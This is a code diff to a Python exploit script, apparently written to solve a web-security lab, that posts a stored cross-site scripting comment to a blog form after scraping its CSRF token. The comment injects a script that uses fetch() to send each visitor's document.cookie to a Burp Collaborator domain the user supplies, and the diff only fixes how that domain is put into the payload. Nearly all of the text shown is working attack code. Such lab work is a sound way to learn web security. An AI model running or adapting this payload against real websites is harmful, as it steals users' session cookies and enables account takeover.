@@ -16,7 +16,7 @@ def run(url, payload=None, proxies=None):
         r = session.get(url.rstrip('/') + "/post?postId=1")
         csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
         user_input = input("[?] Enter the Burp Collaborator domain: ").strip()
-        string = f"'{user_input}'"
+        string1 = user_input
 
         # Step 2: Post comment with XSS payload
         data = {
@@ -24,7 +24,7 @@ def run(url, payload=None, proxies=None):
             "postId": "1",
             "name": "mystic_mido",
             "email": "mystic_mido@mystic_mido.com",
-            "comment": f"<script> fetch('https://{string}/?cookies=' + document.cookie ) </script>"
+            "comment": f"<script> fetch('https://{string1}/?cookies=' + document.cookie ) </script>"
         }
 
         response = session.post(url.rstrip('/') + "/post/comment", data=data)
